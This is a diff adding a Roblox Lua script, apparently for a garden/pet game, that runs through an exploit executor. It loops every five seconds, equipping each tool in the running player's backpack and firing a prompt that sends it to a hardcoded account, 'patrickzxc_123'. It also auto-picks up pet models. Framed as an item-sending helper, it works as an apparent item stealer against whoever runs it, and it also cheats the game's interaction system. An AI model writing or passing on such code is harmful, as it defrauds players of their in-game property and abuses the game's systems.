@@ -1,0 +1,65 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local Humanoid = Character:WaitForChild("Humanoid")
+
+local targetUsername = "patrickzxc_123" -- The player you want to send fruits/pets to
+
+-- Helper function to get target player's proximity prompt
+local function getTargetProximityPrompt()
+    local targetPlayer = Players:FindFirstChild(targetUsername)
+    if targetPlayer then
+        local targetChar = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
+        local hrp = targetChar:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            return hrp:FindFirstChildOfClass("ProximityPrompt"), targetChar
+        end
+    end
+    return nil, nil
+end
+
+-- Auto-send all fruits/pets in Backpack to target player
+local function autoSendItems()
+    local prompt, targetChar = getTargetProximityPrompt()
+    if not prompt then
+        warn("Target proximity prompt not found.")
+        return
+    end
+
+    prompt.HoldDuration = 0.2 -- Speed up interaction
+
+    local Backpack = LocalPlayer:WaitForChild("Backpack")
+    for _, tool in ipairs(Backpack:GetChildren()) do
+        if tool:IsA("Tool") then
+            -- Equip tool and fire the prompt to send it
+            Humanoid:EquipTool(tool)
+            task.wait(0.1)
+            fireproximityprompt(prompt)
+            task.wait(0.2) -- small delay between sends
+        end
+    end
+end
+
+-- Auto pickup pets in the garden
+local function autoPickupPets()
+    -- Adjust "Garden" path as needed
+    local garden = workspace:FindFirstChild("Garden") or workspace
+
+    for _, pet in ipairs(garden:GetChildren()) do
+        -- Change these conditions based on your game's pet naming or structure
+        if pet:IsA("Model") and pet:FindFirstChild("ProximityPrompt") then
+            local prompt = pet:FindFirstChildOfClass("ProximityPrompt")
+            fireproximityprompt(prompt)
+            task.wait(0.3) -- Avoid spamming too fast
+        end
+    end
+end
+
+-- Main loop
+while task.wait(5) do
+    -- Send fruits/pets to target
+    autoSendItems()
+
+    -- Pick up active pets in the garden
+    autoPickupPets()
+end
